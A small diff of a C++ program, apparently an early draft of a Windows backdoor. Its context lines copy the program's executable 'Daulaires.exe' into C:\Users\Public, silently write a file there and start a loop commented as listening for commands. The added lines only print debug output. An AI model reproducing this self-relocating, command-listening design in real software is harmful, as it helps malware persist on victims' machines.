@@ -16,6 +16,7 @@ auto Main::Windows() -> bool
     // Horrible way of listening for commands
     utils.MoveExe("Daulaires.exe", info.getCurrentDirectory(), "C:\\Users\\Public\\");
     Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
+    
 
     while (true) {
 
@@ -104,6 +105,8 @@ auto Main::Windows() -> bool
 
 auto Main::NotWindows(void) -> bool
 {
+    Info Info;
+    cout << Info.isWindows() << endl;
     cout << "You are not using Windows" << endl;
     return 0;
 };
